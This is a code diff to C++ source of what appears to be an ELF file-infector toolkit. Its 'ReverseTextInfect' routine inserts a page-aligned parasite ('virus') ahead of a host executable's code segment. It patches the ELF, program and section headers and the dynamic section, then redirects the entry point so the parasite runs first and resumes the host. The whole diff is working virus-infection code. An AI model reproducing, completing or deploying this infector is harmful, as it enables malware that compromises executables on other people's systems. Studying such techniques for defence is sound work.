@@ -82,7 +82,6 @@ void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
       }
     }
 
-    // Handle CODE segment
     if (idx == code_segment_idx) {
       // extending CODE segment backwards.
       cur_entry->p_filesz += padded_virus_size;
@@ -97,7 +96,10 @@ void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
   ehdr.e_entry = original_code_segment_p_vaddr - padded_virus_size;
   // virus inserted after ehdr.
   if (original_code_segment_file_offset == 0) {
-    ehdr.e_entry += sizeof(Elf64_Ehdr);
+    // Because we need to accomodate the elf header, the virus has padding
+    // before it. The real entry is one page after the originally planned vaddr
+    // in order to make the virus page aligned and rodata relocation safe.
+    ehdr.e_entry += 4096;
   }
 
   // section header always comes after the virus.
@@ -167,77 +169,95 @@ bool patch_dyamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
   return false;
 }
 
+// This function is a bit involved, please see comments in header why we are
+// doing this.
+// |Elf Header|============|      virus       |=============| original CODE
+//            | padding    |page  |page  |page  | padding   |page
 size_t inject_virus(std::span<std::byte> host_mapping,
                     std::span<const std::byte> parasite_mapping,
                     const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
                     Elf64_Off original_code_segment_file_offset) {
-  Elf64_Addr virus_insert_offset = original_code_segment_file_offset;
-  if (virus_insert_offset == 0) {
-    // If CODE includes ehdr, inject after it.
-    virus_insert_offset += sizeof(Elf64_Ehdr);
+  // The real file offset of the virus starting point so we can patch ehdr with.
+  Elf64_Addr real_virus_start_offset = 0;
+  // The virus plus padding both before and after.
+  Elf64_Addr padded_virus_insert_offset = 0;
+  // The extra padding in front of the virus.
+  auto extra = original_code_segment_file_offset == 0 ? 4096 : 0;
+  if (original_code_segment_file_offset == 0) {
+    // The padded virus will be inserted after the elf header because that is
+    // the one thing we can't shift.
+    padded_virus_insert_offset = sizeof(Elf64_Ehdr);
+    // However, we insert extra padding before the virus to make the real virus
+    // start at a page aligned address.
+    real_virus_start_offset = extra;
+  } else {
+    // This happens when we have a non-CODE segment precedding CODE segment. Our
+    // virus code is always page aligned.
+    padded_virus_insert_offset = original_code_segment_file_offset;
+    real_virus_start_offset = padded_virus_insert_offset;
   }
 
   // Shift old content back.
-  vt::memcpy(&host_mapping[virus_insert_offset + padded_virus_size],
-             &host_mapping[virus_insert_offset],
-             host_mapping.size() - padded_virus_size - virus_insert_offset);
+  vt::memcpy(
+      &host_mapping[padded_virus_insert_offset + padded_virus_size],
+      &host_mapping[padded_virus_insert_offset],
+      host_mapping.size() - padded_virus_size - padded_virus_insert_offset);
   // Clear old content. Not required.
-  vt::memset(&host_mapping[virus_insert_offset], 0x00, padded_virus_size);
+  vt::memset(&host_mapping[padded_virus_insert_offset], 0x00,
+             padded_virus_size);
 
-  // Inject the virus.
-  vt::memcpy(&host_mapping[virus_insert_offset], parasite_mapping.data(),
+  // Inject the virus. Make sure use the real virus offset to skip the padding.
+  vt::memcpy(&host_mapping[real_virus_start_offset], parasite_mapping.data(),
              parasite_mapping.size());
 
-  return virus_insert_offset;
+  return real_virus_start_offset;
 }
 
 }  // namespace
 
 bool ReverseTextInfect::inject(std::span<std::byte> host_mapping,
                                std::span<const std::byte> parasite_mapping) {
-  const auto& ehdr =
-      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
-
-  auto padded_virus_size = common::round_up_to(parasite_mapping.size(), 4096);
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   {
     const auto& shdr =
-        *reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
+        reinterpret_cast<const Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
     // Patch .dynamic section if we touched .gnu.hash
     patch_dyamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
-                 original_code_segment_p_vaddr_, padded_virus_size);
+                 original_code_segment_p_vaddr_, padded_virus_size_);
   }
 
   {
     auto& mutable_phdr =
-        *reinterpret_cast<Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
-    patch_phdr(ehdr, mutable_phdr, padded_virus_size,
+        reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
+    patch_phdr(ehdr, mutable_phdr, padded_virus_size_,
                original_code_segment_file_offset_,
                original_code_segment_p_vaddr_, code_segment_idx_);
   }
 
   {
     auto& mutable_shdr =
-        *reinterpret_cast<Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
-    patch_sht(ehdr, mutable_shdr, padded_virus_size,
+        reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
+    patch_sht(ehdr, mutable_shdr, padded_virus_size_,
               original_code_segment_file_offset_,
               original_code_segment_p_vaddr_);
   }
 
   {
     // Patch elf header last
-    auto& mutable_ehdr = *reinterpret_cast<Elf64_Ehdr*>(&host_mapping.front());
+    auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
     patch_ehdr(mutable_ehdr, original_code_segment_p_vaddr_,
-               original_code_segment_file_offset_, padded_virus_size);
+               original_code_segment_file_offset_, padded_virus_size_);
   }
 
-  auto virus_offset =
-      inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size,
+  // We have inserted padding and the virus, but all we care about is the real
+  // virus offset so we can redirect control flow back.
+  auto virus_real_start_offset =
+      inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size_,
                    original_code_segment_file_offset_);
-
   // Patch parasite to resume host code after execution.
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_offset,
+      ehdr.e_type, original_e_entry_, ehdr.e_entry, virus_real_start_offset,
       parasite_mapping.size(), host_mapping);
 }
 
@@ -246,8 +266,7 @@ bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
   host_size_ = host_mapping.size();
   parasite_size_ = parasite_mapping.size();
 
-  const auto& ehdr =
-      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   // this algorithm only supports non-pie
   if (ehdr.e_type != ET_EXEC || ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
@@ -255,7 +274,7 @@ bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
   }
 
   const auto& phdr =
-      *reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
+      reinterpret_cast<const Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
 
   original_e_entry_ = ehdr.e_entry;
   // Point to first entry in PHT
@@ -276,7 +295,11 @@ bool ReverseTextInfect::analyze(std::span<const std::byte> host_mapping,
 }
 
 size_t ReverseTextInfect::injected_host_size() {
-  return host_size_ + common::round_up_to(parasite_size_, 4096);
+  auto extra_padding = original_code_segment_file_offset_ == 0 ? 4096 : 0;
+  padded_virus_size_ =
+      common::round_up_to(padded_virus_size_, 4096) + extra_padding;
+  // See comments in header.
+  return host_size_ + padded_virus_size_;
 }
 
 }  // namespace vt::infector
